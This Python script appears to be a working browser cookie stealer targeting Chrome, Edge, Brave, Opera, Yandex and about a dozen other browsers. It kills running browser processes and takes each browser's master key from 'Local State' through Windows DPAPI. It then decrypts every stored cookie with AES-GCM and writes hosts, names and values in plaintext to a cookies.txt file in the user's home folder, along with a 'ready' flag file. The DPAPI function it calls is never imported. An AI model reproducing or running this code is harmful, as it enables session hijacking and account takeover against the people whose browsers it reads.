import os
import random
import sqlite3
import json
import base64
import time
import ctypes
import psutil
from getpass import getuser
from shutil import copy2
import subprocess
from Crypto.Cipher import AES
import tempfile

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': os.path.join(self.appdata, 'Kometa', 'User Data'),
            'orbitum': os.path.join(self.appdata, 'Orbitum', 'User Data'),
            'cent-browser': os.path.join(self.appdata, 'CentBrowser', 'User Data'),
            '7star': os.path.join(self.appdata, '7Star', '7Star', 'User Data'),
            'sputnik': os.path.join(self.appdata, 'Sputnik', 'Sputnik', 'User Data'),
            'vivaldi': os.path.join(self.appdata, 'Vivaldi', 'User Data'),
            'google-chrome-sxs': os.path.join(self.appdata, 'Google', 'Chrome SxS', 'User Data'),
            'google-chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
            'epic-privacy-browser': os.path.join(self.appdata, 'Epic Privacy Browser', 'User Data'),
            'microsoft-edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
            'uran': os.path.join(self.appdata, 'uCozMedia', 'Uran', 'User Data'),
            'yandex': os.path.join(self.appdata, 'Yandex', 'YandexBrowser', 'User Data'),
            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'iridium': os.path.join(self.appdata, 'Iridium', 'User Data'),
            'opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable'),
            'opera-gx': os.path.join(self.roaming, 'Opera Software', 'Opera GX Stable'),
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)    
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(3)

    def grab_cookies(self):
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(os.path.join(path, 'Local State'))
            self.funcs = [
                self.cookies
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    self.process_browser(name, path, profile, func)

    def process_browser(self, name, path, profile, func):
        try:
            func(name, path, profile)
        except Exception as e:
            print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
                return master_key
        except Exception as e:
            print(f"Error occurred while retrieving master key: {str(e)}")

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def cookies(self, name: str, path: str, profile: str):
        if name in ('opera', 'opera-gx'):
            path = os.path.join(path, 'Network', 'Cookies')
        else:
            path = os.path.join(path, profile, 'Network', 'Cookies')

        if not os.path.isfile(path):
            return

        with tempfile.NamedTemporaryFile(delete=False) as cookievault:
            copy2(path, cookievault.name)

            conn = sqlite3.connect(cookievault.name)
            cursor = conn.cursor()

            with open(os.path.join(f"C:\\Users\\{getuser()}\\cookies.txt"), 'a', encoding="utf-8") as f:
                f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")

                for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                    host_key, name, path, encrypted_value, expires_utc = res
                    value = self.decrypt_password(encrypted_value, self.masterkey)
                    if host_key and name and value != "":
                        f.write(f"Host: {host_key}\t\nName: {name}\t\nValue: {value}\n\n")

            cursor.close()
            conn.close()

        os.remove(cookievault.name)
        time.sleep(3)
        with open(f'C:\\Users\\{getuser()}\\ready.cookies', 'w'):
            pass

# Usage
browser = Browsers()
browser.grab_cookies()
